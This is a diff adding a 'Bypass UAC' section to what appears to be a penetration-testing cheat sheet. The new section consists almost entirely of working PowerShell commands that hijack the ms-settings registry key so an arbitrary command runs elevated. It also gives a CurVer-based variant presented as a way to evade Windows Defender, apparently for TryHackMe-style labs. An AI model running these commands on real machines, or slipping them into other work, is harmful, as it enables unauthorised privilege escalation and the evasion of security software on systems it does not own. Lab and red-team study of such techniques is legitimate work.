@@ -745,6 +745,25 @@ dir flag* /s /p
 dir /s /b *.log
 ```
 
+##### Bypass UAC
+
+```c
+New-Item “HKCU:\Software\Classes\ms-settings\Shell\Open\command” -Force
+New-ItemProperty -Path “HKCU:\Software\Classes\ms-settings\Shell\Open\command” -Name “DelegateExecute” -Value “” -Force
+Set-ItemProperty -Path “HKCU:\Software\Classes\ms-settings\Shell\Open\command” -Name “(default)” -Value <COMMAND> -Force
+```
+
+To bypass Windows Defender.
+Default Version name: `.thm`
+
+```c
+New-Item “HKCU:\Software\Classes\<VERSION NAME>\Shell\Open\command” -Force
+Set-ItemProperty -Path “HKCU:\Software\Classes\<VERSION NAME>\Shell\Open\command” -Name “(default)” -Value <COMMAND> -Force
+
+New-Item “HKCU:\Software\Classes\ms-settings\CurVer” -Force
+Set-ItemProperty -Path “HKCU:\Software\Classes\ms-settings\CurVer” -Name “(default)” -Value <VERSION NAME> -Force
+```
+
 #### PHP Webserver
 
 ```c
